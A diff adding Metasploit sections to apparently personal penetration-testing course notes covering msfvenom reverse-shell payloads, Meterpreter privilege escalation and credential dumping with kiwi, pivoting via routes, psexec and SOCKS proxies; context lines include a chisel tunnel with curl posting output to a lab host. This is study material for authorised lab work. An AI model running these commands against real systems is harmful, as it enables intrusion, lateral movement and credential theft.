@@ -295,3 +295,75 @@ HTTP Tunneling:
         /tmp/chisel client 192.168.45.225:8080 R:socks &> /tmp/output; curl --data @/tmp/output http://192.168.45.225:8080/
     and to connect with ncat use this on our kali:
         ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.243.215
+
+
+METASPLOET:
+    add different workspaces for different pentests:
+    
+        workspace -a pen200
+    discovered hosts:
+        hosts
+    discovered services and ports:
+        services
+        services -p 8000
+    for background:
+        run -j
+        jobs
+after running Auxiliary module on a target, we can leverage vulns option by just typing: vulns
+after exploit crtl+z to send session in backround
+sessions -l to list sessions
+
+To list available payloads for the exploit:
+
+    show payloads
+if we choose meterpreter payload use "help" after gaining shell to see available meterpreter commands
+
+Generate Payloads with msfvenom:
+
+    list:
+        msfvenom -l payloads --platform windows --arch x64
+    create:
+        msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.2 LPORT=443 -f exe -o nonstaged.exe
+    Multihandler in msfconsole instead of netcat:
+        use multi/handler
+        set payload windows/x64/shell/reverse_tcp
+
+Meterpreter post-explo:
+
+    idletme
+    shell
+    getsystem
+    ps -> migrate <pid>
+    execute -H -f notepad -> migrate <notepad pid>
+
+    load kiwi (mimikatz but for metasploit)
+
+pivoting with metasploit:
+    run multi/handler on background with bg:
+
+        bg
+        route add 172.16.5.0/24 12
+        route print
+        use auxiliary/scanner/portscan/tcp 
+    after discovering that ports are open:
+        use exploit/windows/smb/psexec
+
+    use msf as a tunnel:
+        use multi/manage/autoroute
+        set multihandler session and run
+
+        use auxiliary/server/socks_proxy
+        set SRVHOST 127.0.0.1
+        set VERSION 5
+        run -j
+        then update proxychains conf to socks5 127.0.0.1 1080
+        then use as u want. e.g:
+        sudo proxychains xfreerdp /v:172.16.5.200 /u:luiza
+    can do the port forward with multi handler session:
+        portfwd add -l 3389 -p 3389 -r 172.16.5.200
+        sudo xfreerdp /v:127.0.0.1 /u:luiza
+
+metasploit autorun scripts:
+    ls -l /usr/share/metasploit-framework/scripts/resource
+    to run any:
+    sudo msfconsole -r scipt.rc
